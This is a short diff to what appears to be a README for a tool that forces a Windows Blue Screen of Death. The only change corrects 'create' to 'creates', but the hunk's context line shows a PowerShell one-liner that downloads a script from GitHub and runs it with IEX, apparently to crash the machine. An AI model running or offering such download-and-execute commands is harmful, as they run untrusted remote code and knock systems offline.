@@ -20,7 +20,7 @@ PS>IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.
 ```
 ### BSOD.exe
 
-A compiled executable that also create a Blue Screen of Death.
+A compiled executable that also creates a Blue Screen of Death.
 
 Useful when you don't have PowerShell?
 
